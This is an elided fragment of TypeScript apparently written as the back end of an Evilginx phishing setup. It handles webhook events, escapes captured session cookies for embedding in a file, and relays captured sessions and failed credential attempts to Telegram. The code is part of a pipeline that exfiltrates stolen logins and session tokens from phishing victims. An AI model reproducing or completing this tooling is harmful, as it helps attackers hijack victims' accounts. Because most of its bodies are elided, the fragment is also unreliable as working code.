...
async function handleWebhook(request: Request) {
  try {
    ...
    console.log('Received Evilginx event:', payload.event);
...
async function sendSessionCapturedWithFile(
  ...
  // Properly escape the cookies JSON for embedding in template literal
  const cookiesJson = JSON.stringify(cookies).replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
...
async function sendInvalidCredentialMessage(
  ...
  try {
    ...
    if (!response.ok) {
      ...
      console.log('Invalid credential message sent to Telegram');
    }
  } catch (error) {
...
async function sendRegularMessage(
  ...
  try {
    ...
    if (!response.ok) {
      ...
      console.log('Regular message sent to Telegram');
    }
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
